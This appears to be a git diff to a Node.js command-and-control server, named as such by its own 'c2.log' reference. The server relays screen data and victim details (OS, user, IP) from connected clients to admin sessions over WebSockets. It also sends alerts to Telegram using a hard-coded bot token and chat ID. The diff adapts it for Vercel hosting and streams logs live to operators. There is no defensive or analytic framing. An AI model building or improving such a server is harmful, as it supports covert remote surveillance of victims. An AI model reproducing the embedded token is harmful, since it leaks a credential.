@@ -4,7 +4,6 @@ const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
 const https = require('https');
-const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -13,7 +12,10 @@ const wss = new WebSocket.Server({ server });
 // --- CONFIGURATION ---
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
-const LOG_FILE_PATH = path.join(__dirname, 'c2.log');
+
+// In-memory log buffer to replace /var/task/c2.log
+let logBuffer = [];
+const MAX_LOGS = 500;
 
 let clients = {};
 
@@ -21,13 +23,19 @@ app.use(express.static(path.join(__dirname)));
 
 function logToFile(msg) {
     const timestamp = new Date().toISOString();
-    const line = `[${timestamp}] ${msg}\n`;
-    console.log(line.trim());
-    try {
-        fs.appendFileSync(LOG_FILE_PATH, line);
-    } catch (e) {
-        console.error("Failed to write to c2.log", e);
+    const line = `[${timestamp}] ${msg}`;
+    
+    // Push to memory buffer
+    logBuffer.push(line);
+    if (logBuffer.length > MAX_LOGS) {
+        logBuffer.shift();
     }
+
+    // Print to Vercel Console
+    console.log(line);
+
+    // Broadcast to all admins so they see the raw logs in real-time
+    broadcastLogToAdmins(line);
 }
 
 function notifyTelegram(msg) {
@@ -84,8 +92,6 @@ wss.on('connection', (ws, req) => {
             // Handle Heartbeat
             else if (data.type === 'heartbeat') {
                 clients[id].lastSeen = Date.now();
-                // Optional: Log heartbeat occasionally to avoid spamming the log file
-                // logToFile(`[HB] Heartbeat received from ${id}`);
             }
             // Forward Signaling Data
             else if (['offer', 'answer', 'candidate'].includes(data.type)) {
@@ -93,6 +99,11 @@ wss.on('connection', (ws, req) => {
             } 
             // Screen Data / Generic Broadcasts
             else {
+                // If we get screen data but no info yet, create a placeholder user
+                if (!clients[id].info && !clients[id].isAdmin) {
+                    clients[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
+                    notifyAdmin(id, `📺 Screen Active: ${id}`);
+                }
                 broadcastToAdmin(id, data);
             }
         } catch (e) {
@@ -123,8 +134,15 @@ function notifyAdmin(id, msg) {
 function broadcastToAdmin(sourceId, data) {
     wss.clients.forEach(client => {
         if (client.readyState === WebSocket.OPEN && client.isAdmin) {
-            // Ensure the receiver knows who sent this
             client.send(JSON.stringify({ targetId: sourceId, ...data }));
+        }
+    });
+}
+
+function broadcastLogToAdmins(line) {
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+            client.send(JSON.stringify({ type: 'system_log', message: line }));
         }
     });
 }
